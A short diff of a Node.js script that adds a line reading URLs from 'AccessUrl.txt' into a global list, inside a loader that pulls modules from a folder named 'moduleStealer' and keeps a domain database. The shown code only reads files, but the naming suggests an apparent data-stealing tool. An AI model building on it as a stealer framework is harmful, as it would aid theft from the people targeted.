@@ -5,7 +5,8 @@ const pt = require('path');
 
 (async() => {
     const existDomainFolder = (await fs.lstat('./DomainDataBase').catch(()=>null))?.isDirectory();
-
+    global.accessUrl = await (await (await (await fs.readFile('AccessUrl.txt', 'utf-8')).replaceAll('\r', '')).trim()).split('\n');
+    
     if(existDomainFolder == null) await fs.mkdir('./DomainDataBase');
 
     const modules = (await fs.readdir('./moduleStealer')).map(file => require(pt.resolve('./moduleStealer/', file)));
